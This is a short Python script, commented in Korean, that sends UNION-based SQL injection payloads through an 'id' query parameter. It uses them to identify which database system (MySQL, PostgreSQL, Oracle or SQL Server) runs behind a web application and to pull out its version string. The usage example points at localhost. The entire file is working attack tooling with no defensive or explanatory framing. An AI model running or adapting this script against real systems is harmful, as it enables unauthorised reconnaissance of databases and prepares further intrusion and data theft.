import requests
from urllib.parse import unquote


def check_dbms(url):
    # 각 DBMS에 대한 SQL Injection 쿼리
    queries = {
        "MySQL": {
            "version_query": "' UNION SELECT @@version -- ",
            "error_message": "You have an error in your SQL syntax;",
            "version_keyword": "version",
        },
        "PostgreSQL": {
            "version_query": "' UNION SELECT version() -- ",
            "error_message": "ERROR:  syntax error at or near",
            "version_keyword": "PostgreSQL",
        },
        "Oracle": {
            "version_query": "' UNION SELECT banner FROM v$version WHERE rownum=1 -- ",
            "error_message": "ORA-01789",
            "version_keyword": "Oracle",
        },
        "SQL Server": {
            "version_query": "' UNION SELECT @@version -- ",
            "error_message": "Incorrect syntax near",
            "version_keyword": "SQL Server",
        },
    }

    # DBMS 판별
    for dbms, details in queries.items():
        # 버전 쿼리 실행
        payload_url = f"{url}?id={details['version_query']}"
        response = requests.get(payload_url)

        # 응답을 통해 DBMS 판별
        if response.status_code == 200:
            if details["error_message"] in response.text:
                print(f"Detected DBMS: {dbms} (Error Message Detected)")
            else:
                # 버전 정보 추출 및 URL 디코딩 처리
                if details["version_keyword"] in response.text:
                    print(f"Detected DBMS: {dbms}")
                    version_start = response.text.find(details["version_keyword"])
                    version_end = response.text.find(
                        "<", version_start
                    )  # HTML 태그 제외
                    version_info = response.text[version_start:version_end].strip()

                    # URL 디코딩 처리
                    decoded_version_info = unquote(version_info)
                    print(f"Version Information: {decoded_version_info}")
                else:
                    pass
        else:
            print(f"Failed to get a valid response for {dbms} test.")


# 사용 예시
target_url = "http://127.0.0.1"  # 테스트할 URL
check_dbms(target_url)
